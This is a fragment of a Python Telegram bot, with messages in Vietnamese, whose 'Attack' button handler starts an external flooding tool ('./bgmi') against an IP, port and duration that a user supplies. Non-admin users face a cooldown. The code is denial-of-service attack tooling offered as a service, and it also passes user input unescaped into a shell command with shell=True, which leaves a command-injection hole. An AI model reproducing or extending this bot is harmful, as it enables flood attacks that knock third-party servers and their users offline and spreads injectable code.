...
def button_attack(message):
    ...
    if user_id not in admin_id:
        # check cooldown
        last_used = cooldown.get(user_id, 0)
        now = time.time()
        if now - last_used < COOLDOWN_TIME:
            wait_time = int(COOLDOWN_TIME - (now - last_used))
            bot.reply_to(message, f"⚠️ Bạn phải đợi {wait_time}s nữa mới được dùng Attack.")
            return
        cooldown[user_id] = now  # update thời gian

    if message.chat.id not in user_attack_data:
        bot.reply_to(message, "⚠️ Bạn chưa gửi target (ip port time).")
        return

    ip, port, attack_time = user_attack_data[message.chat.id]
    try:
        full_command = f"./bgmi {ip} {port} {attack_time}"
        subprocess.Popen(full_command, shell=True)
        bot.reply_to(message, f"🚀 Attack started: {ip}:{port} trong {attack_time}s")
    except Exception as e:
        bot.reply_to(message, f"❌ Lỗi khi chạy bgmi: {e}")
